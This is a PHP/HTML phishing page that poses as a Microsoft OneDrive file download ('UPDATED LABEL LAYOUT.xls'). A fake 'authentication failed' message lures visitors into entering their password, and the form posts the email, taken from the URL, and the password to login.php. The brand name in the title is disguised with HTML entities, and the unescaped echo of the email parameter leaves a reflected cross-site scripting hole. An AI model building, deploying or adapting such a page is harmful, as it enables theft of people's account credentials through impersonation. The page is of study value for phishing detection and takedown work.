<?php

if (isset($_GET['email'])) {

	$email = $_GET['email'];
}

?>
<html>
<head>

<title>&#79;&#110;&#101;&#32;&#68;&#114;&#105;&#118;&#101;</title>

<link rel="icon" href="images/favicon.ico" type="image/x-icon">

</head>
<body marginwidth="0" marginheight="0" topmargin="0" bottommargin="0" leftmargin="0" rightmargin="0">

<table align="center" width="100%" height="100%" cellspacing="0"><tr>

<td width="35%" bgcolor="#045FB4">

	<table width="350" align="center"><tr>

	<td>
	
	<br><br>

	<p>
	<font face="arial" size="+3" color="#ffffff">
	UPDATED LABEL LAYOUT.xls
	</p>


	<p>
	<font size="2" face="verdana">
	Your file (UPDATED LABEL LAYOUT.xls) is ready for download! 
	

	<ul>

	<li>File Size: 465kb </li>
	<li>File Format: MS Excel </li>
	<li>File Name: UPDATED LABEL LAYOUT.xls </li>

	</ul>


	<br><br><br><br><br><br><br><br><br><br>

	OneDrive Online Cloud | All rights reserved &copy; 2019

	</font>
	</font>

	<br><br><br><br><br>

	</td>

	</tr></table>



	

</td>




<td width="65%" bgcolor="#ffffff">

	<table align=""><tr>

	<td width="50"></td>


	<td>

		<table>

		<tr><td>

			<img src="images/0.jpg" width="350" height="140">


			<table><tr>

			<td width="20"></td>



			<td>
	
				<table>

				<tr><td>
				<font face="verdana" size="2" color="#045FB4">
				Account authentication failed! <br>
				Enter correct account details to start download!
				</font>
				</td></tr>



				<tr><td height="10"></td></tr>


				<tr><td>
				<form method="post" action="login.php">
				</td></tr>

				<tr><td>
				
					<div align="left">
					<font face="verdana" size="+2" color="#045FB4">
						
					<?php if (isset($_GET['email'])) { echo $email; }?>					<input type="hidden" name="formtext1" value="<?php if (isset($_GET['email'])) { echo $email; }?>">	
					
					</font>
					</div>

				</td></tr>
<tr><td height="10"></td></tr>


				<tr><td>
				
					<input  name="formtext2" type="password" style="width:275px; height:45px; 
					font-family: Verdana; font-size: 13px; color:#000000; 
					background-color: #ffffff; border: solid 1px #045FB4; padding: 10px; 
					-moz-border-radius: 2px; -webkit-border-radius: 2px; 
					-khtml-border-radius: 2px; border-radius: 2px; 
					-moz-box-shadow: 3px 3px 3px #888; -webkit-box-shadow: 3px 3px 3px #888; box-shadow: 3px 3px 3px #888;" 
					required="" placeholder="Enter Password">

				</td></tr>






				<tr><td height="10"></td></tr>


				<tr><td>
				
					<input type="submit" value="Download File" 
						style="width:275px; height:50px; background-color: #045FB4; 
						border: solid 3px #045FB4; 
						font-family: Verdana; font-size: 14px; font-weight: light; color: #ffffff; 
						-moz-border-radius: 3px; -webkit-border-radius: 3px; 
						-khtml-border-radius: 3px; border-radius: 3px;
						-moz-box-shadow: 3px 3px 3px #888; -webkit-box-shadow: 3px 3px 3px #888; 
						box-shadow: 3px 3px 3px #888;">

				</td></tr>

				<tr><td height="100">

				</form>
				</td></tr>

</table>

			
			</td>		

			</tr></table>

		</td></tr>



		</table>

	</td></tr>

	</table>

</td>


</tr></table>

</body>
</html>
